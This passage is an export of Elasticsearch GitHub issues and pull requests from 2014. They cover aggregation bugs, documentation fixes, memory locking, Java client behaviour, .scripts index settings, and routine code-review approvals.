</description><key id="41505718">7510</key><summary>Geo: [TEST] Adds tests for GeoUtils</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>test</label><label>v1.5.0</label><label>v2.0.0-beta1</label></labels><created>2014-08-29T14:27:35Z</created><updated>2015-03-19T09:26:50Z</updated><resolved>2014-09-12T08:54:12Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="colings86" created="2014-08-29T15:03:07Z" id="53887838">Not completely sure what the commented out test is doing but have uncommented it as it presumably served a purpose. May be superseded by the other tests now though.

Also I can't work out a good way of testing the earthDiameter(double) method.
</comment><comment author="jpountz" created="2014-08-29T17:18:27Z" id="53904854">LGTM

&gt; Also I can't work out a good way of testing the earthDiameter(double) method.

I don't have ideas either. Let's already push these tests?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Don't update indexShard if it has been removed before</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7509</link><project id="" key="" /><description>Today we have logic that removes a shard from the indexservice if
the shard has changed ie. from replica to primary or if it's recovery
source vanished etc. This can cause shards from been not allocated at
all on a nodes causeing delete requests to timeout since we were waiting
for shards on nodes that got dropped due to a IndexShardMissingException

you'd see exceptions like this before: 

```
  1&gt; org.elasticsearch.index.IndexShardMissingException: [test][5] missing
  1&gt;    at org.elasticsearch.index.service.InternalIndexService.shardInjectorSafe(InternalIndexService.java:293)
  1&gt;    at org.elasticsearch.indices.cluster.IndicesClusterStateService.applyNewOrUpdatedShards(IndicesClusterStateService.java:572)
  1&gt;    at org.elasticsearch.indices.cluster.IndicesClusterStateService.clusterChanged(IndicesClusterStateService.java:184)
  1&gt;    at org.elasticsearch.cluster.service.InternalClusterService$UpdateTask.run(InternalClusterService.java:444)
```
</description><key id="41497152">7509</key><summary>Don't update indexShard if it has been removed before</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Recovery</label><label>bug</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-29T12:52:37Z</created><updated>2015-06-07T18:51:52Z</updated><resolved>2014-08-29T13:24:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-29T13:00:23Z" id="53871902">LGTM. Nice catch
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Aggregations vs Facets</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7508</link><project id="" key="" /><description>I'm just going to put this out there.

Facets, if you wanted global:

``` json
"global": true
```

Aggregations, for the same:

``` json
"global": {}
```

This seems very wrong to me, and could someone explain the thinking around using an object body that has to _always_ be empty?
</description><key id="41480758">7508</key><summary>Aggregations vs Facets</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">designermonkey</reporter><labels /><created>2014-08-29T08:34:59Z</created><updated>2014-08-29T13:08:33Z</updated><resolved>2014-08-29T09:20:08Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-29T09:20:08Z" id="53854385">@designermonkey It does not have to always be empty. The global aggregation is a bucket aggregation, so you can put other aggregations under it and these aggregations will see all documents in the queried indices, see examples at http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-bucket-global-aggregation.html

A global aggregation with an empty body is actually not very useful as it only computes the total number of documents in the queried indices.

Does it make sense?
</comment><comment author="designermonkey" created="2014-08-29T09:26:10Z" id="53854960">There's definitely some confusing info here then: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations-bucket-global-aggregation.html

This clearly says that the global aggregation has an empty body, and the example also clearly shows any  related aggregations in a separate place.

&gt; Does it make sense?

I must say the documentation never makes sense, and the only way I ever figure this stuff out is by asking Google.
</comment><comment author="designermonkey" created="2014-08-29T09:29:27Z" id="53855261">I don't mean to come across as rude, I know, documentation is hard.
</comment><comment author="designermonkey" created="2014-08-29T09:31:28Z" id="53855443">Can I suggest that there be a place where someone who clearly understands this stuff can teach people how to migrate from facets to aggregations?

It has to be admitted this stuff is not the easiest to use, even for clever people ;)
</comment><comment author="jpountz" created="2014-08-29T09:51:34Z" id="53857145">The reason why global is an object and not a boolean is for consistency of the aggregation [syntax](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-aggregations.html#_structuring_aggregations) since an aggregation body must match an aggregation name.

Agreed on the need to have better documentation to migrate from facets to aggregations, I will work on that.
</comment><comment author="designermonkey" created="2014-08-29T09:53:02Z" id="53857292">Thanks @jpountz 

Going to struggle through it for now then.
</comment><comment author="jpountz" created="2014-08-29T13:07:08Z" id="53872654">@designermonkey I just pushed a first version of a migration guide to our docs, please let me know if you have ideas to make it better:

http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/search-facets-migrating-to-aggs.html
</comment><comment author="designermonkey" created="2014-08-29T13:08:33Z" id="53872917">Will read that later, thanks! That's a lot quicker than I thought :)
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improved Suggest Client API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7507</link><project id="" key="" /><description>- Added `SuggestBuilders` (analogous to `QueryBuilders`)
  - supporting `term`, `phrase`, `completion` and `fuzzyCompletion` suggestion builders
- Added `suggest(SuggestionBuilder)` to `SuggestRequest`
  - previously only `suggest(BytesReference)` was supported
- Use new `SuggestBuilders` methods in tests, instead of directly instantiating specific suggestion builder.

closes #7435
</description><key id="41439627">7507</key><summary>Improved Suggest Client API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/areek/following{/other_user}', u'events_url': u'https://api.github.com/users/areek/events{/privacy}', u'organizations_url': u'https://api.github.com/users/areek/orgs', u'url': u'https://api.github.com/users/areek', u'gists_url': u'https://api.github.com/users/areek/gists{/gist_id}', u'html_url': u'https://github.com/areek', u'subscriptions_url': u'https://api.github.com/users/areek/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/753679?v=4', u'repos_url': u'https://api.github.com/users/areek/repos', u'received_events_url': u'https://api.github.com/users/areek/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/areek/starred{/owner}{/repo}', u'site_admin': False, u'login': u'areek', u'type': u'User', u'id': 753679, u'followers_url': u'https://api.github.com/users/areek/followers'}</assignee><reporter username="">areek</reporter><labels><label>:Java API</label><label>feature</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T20:38:48Z</created><updated>2015-06-06T18:21:25Z</updated><resolved>2014-09-01T02:20:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-29T06:04:39Z" id="53840478">left minor comments other than that LGTM feel free to push when you fixed them
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Formula typo in documentation of the DECAY_FUNCTION</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7506</link><project id="" key="" /><description>In this documentation page:
http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html

In the "Decay Function" section, where the "gauss" function is detailed, it says:

`sigma^2 = scale^2 / log(decay)`

This is incorrect. It's actually:

`sigma^2 = -scale^2 / ( 2 * log(decay) )`

(minus sign and factor 2 missing)
</description><key id="41432978">7506</key><summary>Formula typo in documentation of the DECAY_FUNCTION</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/brwe/following{/other_user}', u'events_url': u'https://api.github.com/users/brwe/events{/privacy}', u'organizations_url': u'https://api.github.com/users/brwe/orgs', u'url': u'https://api.github.com/users/brwe', u'gists_url': u'https://api.github.com/users/brwe/gists{/gist_id}', u'html_url': u'https://github.com/brwe', u'subscriptions_url': u'https://api.github.com/users/brwe/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/4320215?v=4', u'repos_url': u'https://api.github.com/users/brwe/repos', u'received_events_url': u'https://api.github.com/users/brwe/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/brwe/starred{/owner}{/repo}', u'site_admin': False, u'login': u'brwe', u'type': u'User', u'id': 4320215, u'followers_url': u'https://api.github.com/users/brwe/followers'}</assignee><reporter username="">mikaelgrave</reporter><labels><label>docs</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T19:38:42Z</created><updated>2014-09-01T19:06:32Z</updated><resolved>2014-09-01T07:52:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-28T19:42:31Z" id="53784862">@mikaelgrave do you wanna go ahead and issue a pullrequest for this?
</comment><comment author="mikaelgrave" created="2014-08-28T22:00:37Z" id="53807936">I'd be glad but the formula that requires a fix is in an image: http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/images/sigma_calc.png
I'm not sure where the image is in the repository and how it was generated.
</comment><comment author="s1monw" created="2014-08-29T06:10:43Z" id="53840799">aaah I see! @brwe can you take this over and fix the image? I guess you might have the sources at hand?
</comment><comment author="brwe" created="2014-09-01T07:45:59Z" id="54030575">@mikaelgrave Thanks for spotting it! For future reference:  For the images, I used this: http://www.codecogs.com/eqnedit.php
Images for doc are located here: https://github.com/elasticsearch/elasticsearch/tree/master/docs/reference/images
</comment><comment author="mikaelgrave" created="2014-09-01T19:06:32Z" id="54085851">Thanks @brwe, looks great now!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Getting incorrect value count using reverse nested aggregation when using more than 1 nested level</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7505</link><project id="" key="" /><description>&lt;p&gt;
Using the following hierarchical data structure

&lt;/p&gt;


&lt;ul&gt;
   &lt;li&gt;author&lt;/li&gt;
   &lt;li&gt;&lt;ul&gt;
            &lt;li&gt;book&lt;/li&gt;
                &lt;li&gt;
                    &lt;ul&gt;
                        &lt;li&gt;review&lt;/li&gt;
                    &lt;/ul&gt;
       &lt;/li&gt;
       &lt;/ul&gt;
    &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt; 
I am trying to find number of books by genre given book.publisher and book.review.rating,
but getting incorrect value count aggregate result.
&lt;/p&gt;

&lt;p&gt;

This is working correctly if I use only 2 levels (book and review), but when I add author level also
then it is failing.
&lt;/p&gt;


Mapping, data and query used below:

&lt;pre&gt;
&lt;code&gt;

curl -XDELETE localhost:9200/authors

curl -XPUT  localhost:9200/authors

curl -XPUT  localhost:9200/authors/author/_mapping
'{
    "author": {
      "properties": {
        "author_id": {
          "type": "long"
        },
        "name": {
          "type": "string"
        },
        "book": {
          "type": "nested",
          "properties": {
            "book_id": {
              "type": "long"
            },
            "name": {
              "type": "string"
            },
            "genre": {
              "type": "string"
            },
            "publisher": {
              "type": "string"
            },
            "review": {
              "type": "nested",
              "properties": {
                "rating": {
                  "type": "string"
                },
                "posted_by": {
                  "type": "string"
                }
              }
            }
          }
        }
      }
    }
  }'
  
 curl -XPUT localhost:9200/authors/author/0
 '{
  "author_id": "1",
  "name": "a1",
  "book": [
    {
      "book_id": "11",
      "name": "a1-b1",
      "genre": "g1",
      "publisher": "p1",
      "review": [
        {
          "rating": "1s",
          "posted_by": "a"
        },
        {
          "rating": "2s",
          "posted_by": "b"
        },
        {
          "rating": "1s",
          "posted_by": "a"
        }
      ]
    },
    {
      "book_id": "12",
      "name": "a1-b2",
      "genre": "g1",
      "publisher": "p1",
      "review": [
        {
          "rating": "1s",
          "posted_by": "a"
        },
        {
          "rating": "2s",
          "posted_by": "b"
        },
        {
          "rating": "1s",
          "posted_by": "a"
        }
      ]
    }
  ]
}'


The book count (book_count) from the following query should be 2 but instead it is 1. 
The output at filter by rating is correct, but the value count isn't.


curl -XPOST localhost:9200/authors/_search
'{
  "size": 0,
  "aggs": {
    "nested_book": {
      "nested": {
        "path": "book"
      },
      "aggregations": {
        "group_by_genre": {
          "terms": {
            "field": "genre"
          },
          "aggregations": {
            "filter_by_publisher": {
              "filter": {
                "bool": {
                  "must": {
                    "term": {
                      "book.publisher": "p1"
                    }
                  }
                }
              },
              "aggregations": {
                "nested_review": {
                  "nested": {
                    "path": "book.review"
                  },
                  "aggregations": {
                    "filter_by_rating": {
                      "filter": {
                        "bool": {
                          "must": {
                            "term": {
                              "book.review.rating": "1s"
                            }
                          }
                        }
                      },
                      "aggregations": {
                        "reverse_to_book": {
                          "reverse_nested": {
                            "path": "book"
                          },
                          "aggregations": {
                            "book_count": {
                              "value_count": {
                                "field": "book_id"
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}'

&lt;/code&gt;
&lt;/pre&gt;
</description><key id="41429455">7505</key><summary>Getting incorrect value count using reverse nested aggregation when using more than 1 nested level</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/martijnvg/following{/other_user}', u'events_url': u'https://api.github.com/users/martijnvg/events{/privacy}', u'organizations_url': u'https://api.github.com/users/martijnvg/orgs', u'url': u'https://api.github.com/users/martijnvg', u'gists_url': u'https://api.github.com/users/martijnvg/gists{/gist_id}', u'html_url': u'https://github.com/martijnvg', u'subscriptions_url': u'https://api.github.com/users/martijnvg/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/580421?v=4', u'repos_url': u'https://api.github.com/users/martijnvg/repos', u'received_events_url': u'https://api.github.com/users/martijnvg/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/martijnvg/starred{/owner}{/repo}', u'site_admin': False, u'login': u'martijnvg', u'type': u'User', u'id': 580421, u'followers_url': u'https://api.github.com/users/martijnvg/followers'}</assignee><reporter username="">spotta</reporter><labels><label>bug</label></labels><created>2014-08-28T19:03:58Z</created><updated>2014-09-08T15:15:34Z</updated><resolved>2014-08-29T21:11:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-28T19:57:00Z" id="53787289">@spotta Can you share the ES version that you're using?
</comment><comment author="spotta" created="2014-08-28T20:11:21Z" id="53790178">I tried using 1.3.1 &amp; 1.3.2, same results 
</comment><comment author="martijnvg" created="2014-08-29T21:12:49Z" id="53930537">Thanks for reporting this bug @spotta. The next release will include a fix for this bug.
</comment><comment author="spotta" created="2014-08-30T13:33:53Z" id="53958554">awesome! thanks for the quick turnaround. 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Still swapping with mlockall enabled</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7504</link><project id="" key="" /><description>Running an ES 1.0.1 instance with 32GB on a 256GB machine. Am locking memory and

```
curl -s 0:9200/_nodes/_local/process?pretty
```

says:

```
      "process" : {
        "refresh_interval" : 1000,
        "id" : 34381,
        "max_file_descriptors" : 500000,
        "mlockall" : true &lt;---
      }
```

So its really locked. Still

```
$ fgrep Swap /proc/34381/status
VmSwap:   394800 kB
```

Its still swapping.

This makes me doubt the 'mockall' paragraph on http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/setup-configuration.html saying:

```
The third option on Linux/Unix systems only, is to use mlockall to try to lock the process
address space into RAM, preventing any Elasticsearch memory from being swapped out. 
```
</description><key id="41422341">7504</key><summary>Still swapping with mlockall enabled</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">rtoma</reporter><labels><label>feedback_needed</label></labels><created>2014-08-28T18:08:16Z</created><updated>2014-10-05T14:58:30Z</updated><resolved>2014-10-05T14:58:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T13:56:57Z" id="54712910">Are you using a VM? Most VMs will just ignore mlockall.  It is worth disabling swap completely, on the VM guest and on the VM host.
</comment><comment author="rtoma" created="2014-09-08T07:34:43Z" id="54784987">Hi @clintongormley, the servers used are physical running RHEL6 on 2.6.32-431.3.1.el6.x86_64.

I've set vm.swappiness=1 and enabled swap again, to allow the OS to swap but only if it really really needs to.
</comment><comment author="ankitajain90" created="2014-09-08T07:36:17Z" id="54785085">set ulimit unlimited and check
</comment><comment author="rtoma" created="2014-09-08T07:37:36Z" id="54785174">My config since many months.

```
elastic hard memlock unlimited
elastic soft memlock unlimited
```
</comment><comment author="ankitajain90" created="2014-09-08T07:44:34Z" id="54785677">what is the result when u do ulimit -a
</comment><comment author="clintongormley" created="2014-09-08T09:16:03Z" id="54793548">@rtoma Mlockall only works on the JVM heap.  I wonder if the swap that was being used comes from the off-heap memory, or possibly (not sure) from mmap'ed data?
</comment><comment author="clintongormley" created="2014-09-08T09:16:31Z" id="54793592">Could you upload the output of:

```
GET /_nodes
GET /_nodes/stats
```
</comment><comment author="rtoma" created="2014-09-09T15:10:08Z" id="54983717">Clinton,
My systems now have vm.swappiness=1 and are not swapping anymore.
Is the requested information still usefull?
</comment><comment author="clintongormley" created="2014-09-09T15:18:30Z" id="54985060">@rtoma probably - it was to get an idea of how much memory you're using in off heap memory.
</comment><comment author="clintongormley" created="2014-10-05T14:58:30Z" id="57938537">No more info given. Closing. Please feel free to reopen if you have more info.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>JAVA API - Search with JSON source and setSize will return no facets</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7503</link><project id="" key="" /><description>  I'm using the 1.3.2 Elasticsearch library with a TrasnportClient client. 

  I create a search with the following JSON:

``` javascript
    { 
        "query": 
        {
            "match_all": {} 
        }, 
        "facets": { 
            "sample": {   
                "date_histogram": { 
                    "field": "dt", 
                    "interval": "1d" 
                }
            } 
        } 
    }
```

  Executing the JSON via curl returns the facets I expect correctly, with the hits.

  If I use the same JSON using the Java API - something in these lines:

``` java

        String query = "{ "
                + " query: { "
                + "         match_all: {} "
                + " }, "
                + " facets: { "
                + "         2: {   "
                + "             date_histogram: { "
                + "                 field: \"dt\", "
                + "                 interval: \"1d\" "
                + "             } "
                + "         } "
                + " } "
                + "}";

        SearchResponse searchRes = esClient.prepareSearch(indexes)
            .setTypes(types)
            .setSource(query.getBytes())
            .execute()
            .actionGet();

```

  I will get both the hits and the facets. In my case I'm not interested in the hits, so I would like to set the size to `0` for the search. I do it like this - query stays the same:

``` java
        SearchResponse searchRes = esClient.prepareSearch(indexes)
            .setTypes(types)
            .setSource(query.getBytes())
                /* Set the size to 0 so that we don't have hits */
                .setSize(0)
            .execute()
            .actionGet();
```

  At this point I get this as result:

``` javascript
{
  "took" : 0,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 348,
    "max_score" : 0.0,
    "hits" : [ ]
  }
}
```

  As you can see the facets have disappeared. I can set the size to anything - for example:

``` java
        SearchResponse searchRes = esClient.prepareSearch(indexes)
            .setTypes(types)
            .setSource(query.getBytes())
                /* Set the size to 1, to make a point */
                .setSize(1)
            .execute()
            .actionGet();
```

  And my response will look something like this:

``` javascript
{
  "took" : 0,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 348,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "indexname",
      "_type" : "estype",
      "_id" : "6037_2",
      "_score" : 1.0,
      "_source":{
      /* Source omitted */
      }
    } ]
  }
}
```

  Still no facets.

  Is this the expected behaviour or some side effect of mixing setSource and setSize?
</description><key id="41421048">7503</key><summary>JAVA API - Search with JSON source and setSize will return no facets</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Wedjaa</reporter><labels /><created>2014-08-28T17:55:32Z</created><updated>2014-09-06T13:55:10Z</updated><resolved>2014-09-06T13:55:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T13:55:10Z" id="54712869">The documentation for `setSource` says:

   /**
     \* Sets the source of the request as a json string. Note, settings anything other
     \* than the search type will cause this source to be overridden, consider using
     \* {@link #setExtraSource(byte[])}.
     */
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Change the default `auto_expand` for the `.scripts` index to `0-all`</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7502</link><project id="" key="" /><description>This commit changes the auto_expand_replicas setting for the `.scripts` index to
0-all from 1-all.
</description><key id="41396094">7502</key><summary>Change the default `auto_expand` for the `.scripts` index to `0-all`</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T14:28:45Z</created><updated>2015-06-07T18:52:29Z</updated><resolved>2014-08-28T14:31:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-28T14:29:28Z" id="53727684">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Using TransportClient produces unnecessary WARNING when going from 1.3.0 to 1.3.1</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7501</link><project id="" key="" /><description>Noticed that I received WARNING like below when upgrading from 1.3.0 to1.3.1:
          WARNING: [Martinex] node null not part of the cluster Cluster [elasticsearch], ignoring...

Found that if I commented out the cluster.name (giving none) in the server's elasticsearch.yml file, then warning goes away. (My client is configured with client.transport.ignore_cluster_name.)

But no warning prior to 1.3.1 regardless of whether cluster.name is specified.
Likely coming from the TransportClient recognizing itself as a node (Martinex in the above example seems to be the transport client's node).  But that is unavoidable, so seems warning message is in-actionable and should not be printed.
</description><key id="41389875">7501</key><summary>Using TransportClient produces unnecessary WARNING when going from 1.3.0 to 1.3.1</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">asteckley</reporter><labels><label>non-issue</label></labels><created>2014-08-28T13:30:23Z</created><updated>2014-08-28T15:52:58Z</updated><resolved>2014-08-28T15:52:52Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-28T15:38:16Z" id="53738679">I looked at the branch and I can't see any changes in the places where we have this log line. What value are you setting to `client.transport.ignore_cluster_name`?
</comment><comment author="asteckley" created="2014-08-28T15:51:25Z" id="53741602">Good point. I used a sample config file and did not edit the sample so I negligently left in not stating either true or false. Only defined it:  
          client.transport.ignore_cluster_name
Explicitly setting it to true removes the problem:
          client.transport.ignore_cluster_name=true

So 1.3.0 did not care about my faux paus... 1.3.1 did.  

(I guess the better message would be that the parameter was not specified properly. But basic problem solved. Thank you.)
</comment><comment author="s1monw" created="2014-08-28T15:52:52Z" id="53741851">&gt; (I guess the better message would be that the parameter was not specified properly. But basic problem solved. Thank you.)

well it just uses the default value in that case which is false... anyway thanks for opening the issue! Glad it's fixed
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix `.script` index template.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7500</link><project id="" key="" /><description>This commit makes the default number of shards for the .scripts index to `1`, it also
forces the auto_expand replicas to `1-all`. This change means that script index GET requests to load
scripts from the index should always use the local copy of the scripts index, preventing any network traffic or calls on script GET.
</description><key id="41388050">7500</key><summary>Fix `.script` index template.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">GaelTadh</reporter><labels><label>:Indexed Scripts/Templates</label><label>bug</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T13:09:21Z</created><updated>2015-06-07T18:52:51Z</updated><resolved>2014-08-28T13:55:11Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-28T13:26:42Z" id="53718789">@GaelTadh  this looks good to me I think @martijnvg should look over this one more time as well.
</comment><comment author="martijnvg" created="2014-08-28T13:43:11Z" id="53720962">@GaelTadh LGTM
</comment><comment author="sofianito" created="2014-10-29T11:59:33Z" id="60911184">Is this issue fixed in 1.3.3 and 1.3.4?

Thanks
</comment><comment author="clintongormley" created="2014-10-29T12:05:30Z" id="60911953">yes
</comment><comment author="sofianito" created="2014-10-29T14:23:54Z" id="60932082">In 1.3.2, the .scripts index was created by default with 5 primary and 1 replica shards.

I just upgraded to 1.3.4, and now the .scripts index is created with 1 primary and 0 replica shards.

The only way I figured out to change the .scripts shards number is to create it manually before indexing any search template:

```
PUT .scripts
{
  ".scripts": {
    "settings": {
      "index": {
        "number_of_replicas": "1",
        "number_of_shards": "5"
      }
    }
  }
}
```

Is this the recommended way? Are there any recommended values for the .scripts' replicas and shards numbers?

Thanks.
</comment><comment author="clintongormley" created="2014-10-29T14:41:23Z" id="60935267">@sofianito that is the recommended way, but why do you want so many shards for scripts?  one shard should be plenty
</comment><comment author="sofianito" created="2014-10-29T14:52:38Z" id="60937407">Thank you very much!. I'll ask our Devops team to stick with default value.
</comment><comment author="sofianito" created="2014-10-31T22:01:58Z" id="61337411">@clintongormley: One more question. What happens if we have a cluster of two nodes and the master goes down? I understand we won't have failover since the .scripts default replica number is 0. Which means we would need to change the default replica number to 1 at least, isn't it?

Thanks
</comment><comment author="clintongormley" created="2014-11-01T14:52:32Z" id="61370557">@sofianito no - if you read the description at the top, you'll see that `auto_expand_replicas` is set to `1-all`, so there should be a copy of this index on every node.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Use ConcurrentHashMap in SCAN search to keep track of the reader states.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7499</link><project id="" key="" /><description>PR for #7478
</description><key id="41384290">7499</key><summary>Use ConcurrentHashMap in SCAN search to keep track of the reader states.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Search</label><label>bug</label><label>v1.2.5</label><label>v1.3.3</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T12:23:32Z</created><updated>2015-06-07T18:53:09Z</updated><resolved>2014-08-28T14:37:01Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-28T13:02:15Z" id="53716020">Should ReaderState.count and done also be made volatile to ensure visibility of the changes?
</comment><comment author="jpountz" created="2014-08-28T13:27:53Z" id="53718937">@martijnvg just told me that they are no modified after having been added to the map, so that is fine. :-)
</comment><comment author="jpountz" created="2014-08-28T13:32:05Z" id="53719514">LGTM
